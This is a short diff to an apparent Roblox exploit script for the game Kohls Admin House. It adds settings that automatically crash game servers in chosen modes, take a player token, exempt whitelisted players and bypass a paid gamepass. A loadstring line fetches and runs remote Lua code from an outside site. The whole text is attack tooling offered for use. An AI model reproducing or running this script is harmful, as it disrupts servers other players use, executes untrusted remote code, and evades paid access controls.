@@ -1,1 +1,7 @@
+getgenv().autocrasher = false -- Turn this on and it will autocrash KAH's servers.
+getgenv().playertoken = ' ' -- You must get this. Go to  kohlslite.pages.dev/Assets/PLAYERTOKEN.lua for instructions.
+getgenv().acgames = "All" -- What KAH games you want to crash ("All" for NBC and BC, "NBC" for NBC only, "BC" for BC only).
+getgenv().whitelistedppl = {"ScriptingProgrammer"} -- It will not crash servers that have whitelisted players.
+getgenv().perm = false -- If you don't have the perm gamepass, turn this on and it will give you a pad.
+getgenv().acmode = "Dog" -- How you want to crash the server (Dog, Freeze, Shield).
 loadstring(game:HttpGet("https://kohlslite.pages.dev/source.lua"))()
